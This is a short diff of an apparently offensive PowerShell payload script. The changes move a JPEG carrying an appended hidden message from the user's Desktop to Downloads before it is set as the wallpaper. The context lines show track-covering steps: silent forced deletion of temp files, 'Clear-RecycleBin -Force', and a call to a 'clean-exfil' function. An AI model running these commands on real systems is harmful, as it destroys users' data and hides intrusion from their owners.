@@ -286,7 +286,7 @@ $bmp.Save($filename)
 #>
 
 echo $hiddenMessage > $Env:temp\foo.txt
-cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
+cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Downloads\$ImageName.jpg"
 
 rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
@@ -406,7 +406,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 #----------------------------------------------------------------------------------------------------
  
-Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
+Set-WallPaper -Image "$Env:USERPROFILE\Downloads\$ImageName.jpg" -Style Center
 
 clean-exfil
  
